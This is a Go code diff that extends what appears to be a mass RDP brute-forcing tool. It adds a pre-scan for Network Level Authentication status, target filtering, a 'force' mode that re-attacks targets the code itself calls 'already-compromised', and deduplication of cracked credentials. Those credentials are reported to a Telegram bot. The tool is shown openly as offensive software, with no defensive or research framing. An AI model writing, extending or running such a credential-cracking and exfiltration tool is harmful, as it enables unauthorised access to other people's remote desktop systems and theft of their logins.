@@ -35,6 +35,12 @@ var (
 	enableTelegram          bool = true
 	verbose                 bool = false
 
+	// NLA checker flags
+	enableNLACheck   bool
+	nlaCheckerThreads int
+	bruteNLAOnly      bool
+	forceRescan       bool // If true, don't skip already-compromised targets
+
 	// Telegram configuration (load from env or flags for security)
 	telegramBotToken string
 	telegramChatID   int64
@@ -134,6 +140,9 @@ func sendTelegramMessage(text string) {
 
 // printSuccessfulLogin handles successful credential discoveries
 func printSuccessfulLogin(ctx context.Context, results chan string, localIP string) {
+	// Track already-reported credentials to prevent duplicates
+	reportedCredentials := &sync.Map{}
+
 	for {
 		select {
 		case <-ctx.Done():
@@ -142,6 +151,12 @@ func printSuccessfulLogin(ctx context.Context, results chan string, localIP stri
 			if !ok {
 				return
 			}
+
+			// Skip if already reported (deduplication)
+			if _, exists := reportedCredentials.Load(credentials); exists {
+				continue
+			}
+			reportedCredentials.Store(credentials, true)
 
 			atomic.AddInt64(&stats.goods, 1)
 
@@ -388,6 +403,12 @@ func init() {
 	flag.IntVar(&CONCURRENT_PER_WORKER, "c", 5, "Concurrent connections per worker")
 	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
 
+	// NLA checker flags
+	flag.BoolVar(&enableNLACheck, "nlcheck", false, "Scan targets for NLA status before brute-forcing")
+	flag.IntVar(&nlaCheckerThreads, "nlt", 0, "Number of threads for NLA checker (default: CPU*4)")
+	flag.BoolVar(&bruteNLAOnly, "nla-only", false, "Only brute-force NLA-enabled targets (requires -nlcheck)")
+	flag.BoolVar(&forceRescan, "force", false, "Force re-scan of all targets (don't skip already-compromised)")
+
 	// Telegram configuration flags
 	flag.StringVar(&telegramBotToken, "tg-token", "", "Telegram bot token (or set TELEGRAM_BOT_TOKEN)")
 	flag.Int64Var(&telegramChatID, "tg-chatid", 0, "Telegram chat ID (or set TELEGRAM_CHAT_ID)")
@@ -493,6 +514,45 @@ func main() {
 		})
 	}
 
+	// NLA Pre-scan (if enabled)
+	if enableNLACheck {
+		fmt.Println()
+		fmt.Println("================================================")
+		fmt.Println("         NLA PRE-SCAN ENABLED                  ")
+		fmt.Println("================================================")
+		fmt.Printf("Scanning %d targets for NLA status...\n", len(currentTask.Targets))
+		fmt.Println()
+
+		nlaResults := RunNLAScan(currentTask.Targets, nlaCheckerThreads, DefaultNLATimeout, 2)
+
+		// Print and save NLA results
+		PrintNLASummary(nlaResults)
+		if err := SaveNLAResults(nlaResults); err != nil {
+			fmt.Printf("⚠️  Error saving NLA results: %v\n", err)
+		} else {
+			fmt.Println("NLA results saved to: NLA.txt, SSL.txt, RDP_NoNLA.txt, NLA_TIMEOUT.txt, NLA_ERROR.txt")
+			fmt.Println()
+		}
+
+		// Filter targets based on NLA results
+		if bruteNLAOnly {
+			// Only brute NLA-enabled targets
+			currentTask.Targets = nlaResults.GetBruteTargets(true)
+			fmt.Printf("🎯 Brute-forcing NLA-only targets: %d targets (filtered from %d)\n", len(currentTask.Targets), len(nlaResults.NLA)+len(nlaResults.SSL)+len(nlaResults.RDP))
+		} else {
+			// Brute all reachable targets (NLA + SSL + RDP)
+			currentTask.Targets = nlaResults.GetBruteTargets(false)
+			fmt.Printf("🎯 Brute-forcing all reachable targets: %d targets (filtered from %d)\n", len(currentTask.Targets), len(currentTask.Targets)+len(nlaResults.Timeout)+len(nlaResults.Errors))
+		}
+
+		if len(currentTask.Targets) == 0 {
+			fmt.Println("❌ No valid targets to brute-force after NLA scan")
+			return
+		}
+
+		fmt.Println()
+	}
+
 	// Create job and dispatch to workers
 	wholeTask := task{
 		targetsRaw:      currentTask.Targets,
@@ -518,8 +578,14 @@ func main() {
 	// Start result handler
 	go printSuccessfulLogin(resultCtx, results, localIP)
 
-	// Load already-compromised targets for skip-on-resume
-	successfulTargets := loadSuccessfulTargets()
+	// Load already-compromised targets for skip-on-resume (unless -force is set)
+	var successfulTargets *sync.Map
+	if forceRescan {
+		successfulTargets = &sync.Map{}
+		fmt.Println("⚡ Force mode: Will re-scan ALL targets (including already-compromised)")
+	} else {
+		successfulTargets = loadSuccessfulTargets()
+	}
 
 	// Start workers
 	var wg sync.WaitGroup
